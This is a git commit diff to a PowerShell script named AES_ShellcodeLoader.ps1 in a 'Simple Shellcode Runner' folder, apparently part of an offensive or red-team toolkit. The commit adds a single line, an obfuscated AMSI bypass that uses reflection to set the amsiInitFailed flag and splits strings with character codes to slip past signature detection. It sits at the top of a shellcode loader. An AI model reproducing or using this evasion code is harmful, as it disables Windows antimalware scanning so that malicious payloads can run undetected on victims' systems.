911c5e90656eede65361107ca9c1d4d93d5c63e1
Antonio Plantaš <114411757+n3k7ar91@users.noreply.github.com>
2024-09-20 21:07:08 +0200

    Update AES_ShellcodeLoader.ps1

--- Simple Shellcode Runner/AES_ShellcodeLoader.ps1
+++ Simple Shellcode Runner/AES_ShellcodeLoader.ps1
@@ -1,3 +1,4 @@
+[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)
 function LookupFunc {
     Param (
         $moduleName, 
